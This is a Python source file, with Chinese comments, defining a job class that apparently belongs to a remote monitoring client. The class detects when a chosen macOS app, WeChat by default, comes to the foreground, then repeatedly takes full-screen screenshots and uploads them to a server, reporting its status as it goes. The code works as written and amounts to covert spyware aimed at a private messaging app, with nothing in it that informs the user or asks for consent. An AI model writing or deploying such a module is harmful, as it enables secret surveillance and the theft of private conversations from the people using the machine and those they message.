import os
import threading
import time
import tempfile

from client.jobs.core.job import Job
from core.utils.formatting import get_time
from core.utils.logger import logger


class SimpleAppScreenshot(Job):
    """
    超简化版本：应用切换到前台后持续截图
    """

    def __init__(self, target_app='WeChat', interval=10):
        super().__init__()
        self.target_app = target_app
        self.interval = interval
        self.is_foreground = False
        self.last_screenshot_time = 0
        self.screenshot_count = 0

    def run(self):
        try:
            time.sleep(2)
            self.send_to_server(1, f'{self.target_app} screenshot monitor started', 0)

            # 检查库
            try:
                import pyautogui
                from Quartz import (
                    CGWindowListCopyWindowInfo,
                    kCGWindowListOptionOnScreenOnly,
                    kCGNullWindowID
                )
            except ImportError as e:
                self.send_to_server(0, f'Import error: {e}', 0)
                self.mark_stopped()
                return

            self.mark_running()
            self.send_to_server(1, f'Monitoring {self.target_app} (interval: {self.interval}s)', 0)

            while not self.stop_event.is_set():
                current_foreground = self._is_app_foreground(self.target_app)

                # 状态变化通知
                if current_foreground != self.is_foreground:
                    self.is_foreground = current_foreground
                    if self.is_foreground:
                        self.send_to_server(1, f'{self.target_app} switched to foreground', 0)
                        # 切换到前台时立即截图
                        self._take_fullscreen_screenshot()
                        self.last_screenshot_time = time.time()
                    else:
                        self.send_to_server(1, f'{self.target_app} switched to background', 0)

                # 在前台状态时，按间隔截图
                if self.is_foreground:
                    current_time = time.time()
                    if current_time - self.last_screenshot_time >= self.interval:
                        self._take_fullscreen_screenshot()
                        self.last_screenshot_time = current_time

                time.sleep(1)  # 每秒检测一次前台状态

            self.send_to_server(1, f'{self.target_app} screenshot monitor stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Monitor error: {e}', 0)
        finally:
            self.mark_stopped()
            logger.info(f'Thread ended: {threading.current_thread().name}')
            self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)

    def stop(self, notify: bool = True):
        self.request_stop(notify=notify)

    def _get_frontmost_app(self):
        """获取当前最前端的应用名称"""
        try:
            from Quartz import (
                CGWindowListCopyWindowInfo,
                kCGWindowListOptionOnScreenOnly,
                kCGNullWindowID
            )

            windows = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)

            for window in windows:
                layer = window.get('kCGWindowLayer', 999)
                if layer == 0:
                    return window.get('kCGWindowOwnerName', '')
            return None
        except:
            return None

    def _is_app_foreground(self, app_name):
        """检查指定应用是否在前台"""
        try:
            frontmost_app = self._get_frontmost_app()
            return frontmost_app and app_name.lower() in frontmost_app.lower()
        except:
            return False

    def _take_fullscreen_screenshot(self):
        """全屏截图并上传"""
        try:
            import pyautogui

            screenshot = pyautogui.screenshot()

            temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
            temp_file.close()
            screenshot.save(temp_file.name)

            try:
                file_size = os.path.getsize(temp_file.name)

                self.send_to_server(1, f'Captured fullscreen ({file_size} bytes)', 0)

                filename = f'{self.target_app}_screenshot_{get_time()}.png'
                self.upload_file_via_http(temp_file.name, f'{self.target_app}_screenshots')

                self.screenshot_count += 1
                self.send_to_server(1, f'Uploaded (total: {self.screenshot_count})', 0)

            finally:
                try:
                    os.unlink(temp_file.name)
                except:
                    pass

        except Exception as e:
            self.send_to_server(0, f'Screenshot failed: {e}', 0)